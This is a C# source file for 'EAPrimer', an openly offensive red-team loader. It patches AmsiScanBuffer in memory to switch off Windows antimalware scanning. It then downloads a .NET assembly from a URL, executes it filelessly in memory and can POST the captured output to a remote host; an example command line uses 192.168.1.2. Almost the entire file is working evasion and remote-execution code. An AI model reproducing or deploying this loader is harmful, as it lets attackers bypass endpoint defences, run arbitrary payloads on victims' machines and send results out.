using System;
using System.IO;
using System.Net;
using System.Text;
using System.Reflection;
using System.Collections.Generic;
using System.Runtime.InteropServices;

/*
Author: m8sec
Description: DeObfuscated version of EAPrimer project
References:
    https://github.com/Flangvik/NetLoader  
    https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs
*/

namespace EAPrimer
{
    public class Program
    {
        [DllImport("kernel32")]
        private static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        private static extern IntPtr GetProcAddress(
            IntPtr hModule,
            string procName
        );

        [DllImport("kernel32")]
        private static extern bool VirtualProtect(IntPtr lpAddress,
            UIntPtr dwSize,
            uint flNewProtect,
            out uint lpflOldProtect
        );

        private static void MemoryPatch()
        {
            try
            {
                // Load amsi.dll and get location of AmsiScanBuffer
                var lib = LoadLibrary("amsi.dll");
                IntPtr asb = GetProcAddress(lib, "AmsiScanBuffer");

                var patch = GetPatch;

                // Set region to RWX
                VirtualProtect(asb, (UIntPtr)patch.Length, 0x40, out uint oldProtect);

                // copy patch
                CopyData(patch, asb);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] {0}", ex.Message);
            }
        }

        static byte[] GetPatch
        {
            get
            {
                if (System.Environment.Is64BitOperatingSystem)
                {
                    return new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
                }

                return new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
            }
        }

        private static void CopyData(byte[] datInfo, IntPtr MemVal, int placeHolder = 0)
        {
            Marshal.Copy(datInfo, placeHolder, MemVal, datInfo.Length);
        }

        private static string Decoder(string sEncoded, string sKey)
        {
            // B64 decode string x key length
            string tmpString = sEncoded;
            for (int i = 0; i < sKey.Length; i++)
            {
                tmpString = Encoding.UTF8.GetString(Convert.FromBase64String(tmpString));
            }
            return tmpString;
        }

        private static string Encoder(string sData, string sKey)
        {
            // B64 encode string x key length
            string tmpString = sData;
            for (int i = 0; i < sKey.Length; i++)
            {
                tmpString = Convert.ToBase64String(Encoding.UTF8.GetBytes(tmpString));
            }
            return tmpString;
        }

        private static void PostData(string URL, string postData)
        {
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            WebClient wc = new WebClient();
            wc.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36");
            wc.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
            wc.UploadString(URL, "POST", postData);
        }

        private static byte[] GetAssembly(string URL)
        {
            // Get assembly from web
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            WebClient wc = new WebClient();
            wc.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36");
            return wc.DownloadData(URL);
        }

        private static Dictionary<string, string> ParseArgs(string[] args)
        {
            var arguments = new Dictionary<string, string>();
            foreach (var argument in args)
            {
                var x = argument.IndexOf('=');
                if (x > 0)
                {
                    arguments[argument.Substring(0, x)] = argument.Substring(x + 1);
                }
                else
                {
                    arguments[argument] = string.Empty;
                }
            }
            return arguments;
        }

        private static void ExecuteAssembly(byte[] assemblyBytes, object[] asmArgs)
        {
            // primary function to execute assembly
            getEntry(asmLoad(assemblyBytes)).Invoke(null, asmArgs);
        }

        private static Assembly asmLoad(byte[] assemblyBytes)
        {
            // load assembly from bytes
            return Assembly.Load(assemblyBytes);
        }

        private static MethodInfo getEntry(Assembly asmObj)
        {
            // get entry point from assembly object
            return asmObj.EntryPoint;
        }

        public static void Main(string[] args)
        {
            var outputData = "";
            byte[] assemblyBytes = null;
            string[] assemblyArgs = { };
            var origOut = Console.Out;
            Dictionary<string, string> arguments = ParseArgs(args);

            using (var writer = new StringWriter())
            {
                try
                {
                    // Setup writer
                    if (arguments.ContainsKey("-post"))
                    {
                        Console.SetOut(writer);
                    }
                    else
                    {
                        Console.SetOut(origOut);
                    }

                    Console.WriteLine("[*] EAPrimer v0.1.2");
                    if (arguments.Count < 1 || arguments.ContainsKey("-help") || !arguments.ContainsKey("-path"))
                    {
                        Console.WriteLine("\n-path\tURL or local path to assembly");
                        Console.WriteLine("-post\tLocal path for output or URL to POST base64 encoded results. Default: console output.");
                        Console.WriteLine("-args\tAdd arguments for target assembly.\n\n");
                        Console.WriteLine("EAPrimer.exe -path=https://192.168.1.2/assembly.exe -post=https://192.168.1.2 -args=\"-arg1 example_value\"\n");
                    }
                    else
                    {
                        Console.WriteLine("[*] Applying In-Memory Patch");
                        MemoryPatch();

                        if (arguments.ContainsKey("-args"))
                        {
                            assemblyArgs = new String[] { arguments["-args"] };
                            Console.WriteLine("[*] Assembly Args: \"{0}\"", assemblyArgs);
                        }

                        if (arguments["-path"].StartsWith("http://") || arguments["-path"].StartsWith("https://"))
                        {
                            Console.WriteLine("[*] Loading Asembly: {0}", arguments["-path"]);
                            assemblyBytes = GetAssembly(arguments["-path"]);
                        }
                        else
                        {
                            Console.WriteLine("[*] Loading Asembly from: {0}", arguments["-path"]);
                            assemblyBytes = File.ReadAllBytes(arguments["-path"]);
                        }

                        ExecuteAssembly(assemblyBytes, new object[] { assemblyArgs });
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[!] " + ex);
                }

                outputData = writer.GetStringBuilder().ToString();
                writer.Flush();
                Console.WriteLine(outputData);

                Console.SetOut(origOut);
                if (arguments.ContainsKey("-post"))
                {
                    if (arguments["-post"].StartsWith("http://") || arguments["-post"].StartsWith("https://"))
                    {
                        PostData(arguments["-post"], outputData);
                    }
                    else
                    {
                        using (StreamWriter w = new StreamWriter(arguments["-post"]))
                        {
                            Console.SetOut(w);
                            Console.WriteLine(outputData);
                        }
                    }
                }
                else
                {
                    Console.WriteLine(outputData);
                }
            }
        }

    }
}
